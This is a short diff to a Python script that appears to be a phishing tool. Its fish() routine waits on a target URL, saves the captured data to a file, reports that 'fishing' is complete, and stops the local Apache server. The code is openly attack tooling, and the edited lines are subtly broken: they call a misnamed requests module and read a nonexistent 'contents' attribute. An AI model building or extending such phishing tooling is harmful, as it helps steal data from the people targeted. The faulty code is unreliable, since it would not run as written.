@@ -114,20 +114,21 @@ def fish():
     while 1:
         try:
             print("[*] Listening on http//%s ...." % host)
-            data = urllib.request.urlopen(target_URL)
+            data = request.get(target_URL)
+            if data.status_code == 200:
+                f = open(fileName, 'w')
+                for line in data.contents:
+                    f.write(line.decode("utf-8"))
+                f.close()
             break
         except:
             time.sleep(5)
-    if not data:
+    if not data.content:
         print("[-] Unable to recieve the data")
         print("[-] Exiting the attack")
         return
     print("[+] Data reveived")
-    f = open(fileName, 'w')
-    for line in data:
-        f.write(line.decode("utf-8"))
-    f.close()
-
+    
     print('[+] Fishing completed, the file is stored as:  %s' % fileName)
     if version == 'Linux':
         os.system('sudo service apache2 stop')
